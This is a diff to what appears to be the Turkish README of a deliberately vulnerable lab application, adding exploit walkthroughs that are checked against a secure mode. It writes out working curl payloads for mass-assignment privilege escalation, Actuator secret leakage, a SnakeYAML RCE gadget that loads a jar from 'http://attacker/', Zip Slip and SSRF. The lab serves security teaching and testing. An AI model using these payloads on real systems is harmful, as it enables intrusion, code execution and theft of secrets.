@@ -116,6 +116,53 @@ metakarakterler literal, enjeksiyon çalışmaz.
 
 ---
 
+## Ek Açıklar
+
+### Mass Assignment → PrivEsc (register)
+```bash
+curl -s -X POST localhost:8080/api/auth/register -H 'Content-Type: application/json' \
+  -d '{"email":"pwn@evil.com","password":"password1","roles":"ADMIN"}'
+# sonra login -> donen token ADMIN rollu -> GET /api/files/all 200
+```
+Güvenli modda `roles` yok sayılır (her zaman USER).
+
+### Recon: Actuator env / heapdump
+```bash
+curl -s localhost:8080/actuator/env | grep -i jwt          # app.jwt.secret sizar
+curl -s localhost:8080/actuator/heapdump -o heap.hprof      # bellekten token/parola cikarma
+```
+
+### SnakeYAML unsafe load (CVE-2022-1471)
+```bash
+# arbitrary tip instantiation (kanit):
+curl -s -X POST localhost:8080/api/files/import/yaml -H "Authorization: Bearer $USER_JWT" \
+  -H 'Content-Type: text/plain' --data '!!java.util.Date []'
+# -> loaded type=java.util.Date ...
+# RCE gadget (uzak jar + ScriptEngineFactory servisi gerekir):
+#   !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]
+```
+Güvenli modda `SafeConstructor` → keyfi sınıf reddedilir (400).
+
+### Zip Slip (extract)
+```bash
+# entry adi "../pwned.txt" olan bir zip hazirla, sonra:
+curl -s -X POST localhost:8080/api/files/extract -H "Authorization: Bearer $USER_JWT" \
+  -F "file=@evil.zip"
+# vuln: donen yol depo disina ("..") yazar; guvenli: 400
+```
+
+### SSRF → iç servis (docker-compose)
+```bash
+curl -s -X POST localhost:8080/api/files/import -H "Authorization: Bearer $USER_JWT" \
+  -H 'Content-Type: application/json' -d '{"url":"http://internal/secret"}'
+# -> FLAG{ssrf_reached_internal_service}
+```
+
+---
+
 ## Güvenli Mod Doğrulaması
 `application-vuln.properties` içinde `vuln.enabled=false` (veya profili kapat) → yukarıdaki
 tüm istekler 401/403/404/parametreli-güvenli davranışla sonuçlanır.
+
+Bu davranış `SecureModeIT` ile otomatik test edilir; exploit'lerin çalıştığı ise
+`VulnChainIT` ile. `./mvnw test` ikisini de koşar.
